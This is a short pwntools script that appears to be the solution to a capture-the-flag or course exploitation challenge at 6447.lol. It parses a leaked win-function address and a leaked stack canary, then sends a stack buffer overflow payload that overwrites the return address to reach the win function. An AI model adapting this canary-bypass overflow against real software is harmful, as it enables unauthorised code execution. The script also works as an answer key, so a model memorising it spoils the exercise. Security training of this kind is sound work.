#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 6002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def exploit():
    P.recvuntil(b'win function @')
    WIN = P.recvline()[:-1]
    E.address = int(WIN, 16) - E.sym['win'] # aslr defeated
    log.info(f"Win function: {hex(E.symbols['win'])}")
    P.recvuntil(b'canary[')
    CANARY = int(P.recvline()[:-3], 16)
    log.info(f"Canary: {hex(CANARY)}")
    offset_1 = 47
    offset_2 = 9
    payload = b'A' * offset_1 + p64(CANARY) + b'A' * offset_2 + b'A' * 8 + p64(E.symbols['win'])
    P.sendline(payload)
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
